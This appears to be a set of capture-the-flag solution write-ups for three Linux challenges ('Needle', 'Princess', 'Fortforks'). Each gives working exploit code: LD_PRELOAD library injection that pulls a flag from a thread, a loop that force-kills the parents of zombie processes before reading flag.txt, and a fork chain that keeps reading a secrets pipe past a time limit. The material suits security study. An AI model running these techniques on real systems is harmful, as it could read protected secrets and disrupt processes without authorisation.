# Needle
```bash
cat > meeting.c << 'EOF'
```
```c
#include <stdio.h>
#include <pthread.h>

extern pthread_t retrieval;

void* meeting(void* arg) {
    void* flag_ptr = NULL;
    
    if (pthread_join(retrieval, &flag_ptr) == 0) {
        printf("Heisted fabric: %s\n", (char*)flag_ptr);
    } else {
        printf("Failed to steal the fabric.\n");
    }
    
    return "Guest";
}
```
```bash
EOF
gcc -shared -fPIC meeting.c -o libmeeting.so -lpthread
LD_PRELOAD=./libmeeting.so ./meeting
```





# Princess
run this
```bash
while true; do for p in $(ps -eo ppid=,stat=,comm= | awk '$2 == "Z" && $3 ~ /^princess_/ && $1 != 1 {print $1}' | sort -u); do echo "killing parent PID $p"; kill -9 "$p" 2>/dev/null; done; done
```
and go watch some yt shorts in the meantime, then
```bash
cd /home/ctf
cat flag.txt
```






# Fortforks
The approach is to have multiple processes read data from the secrets pipe, since any single process can live for only 5 seconds. This output is written to the `result.txt` file. One second later, enter the container and run ```tail -n 5 result.txt```.

```c
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdlib.h>

int main(void) {
    pid_t pid = fork();

    if (pid == 0) {
        setsid();

        FILE *result = fopen("result.txt", "w");
        int source = open("secrets", O_RDONLY);

        char buffer[4096];
        ssize_t count;

        while ((count = read(source, buffer, sizeof(buffer))) > 0) {
            fwrite(buffer, 1, count, result);
            fflush(result);

            pid = fork();
            if (pid > 0) break;
	        
        }
    }

    return 0;
}
```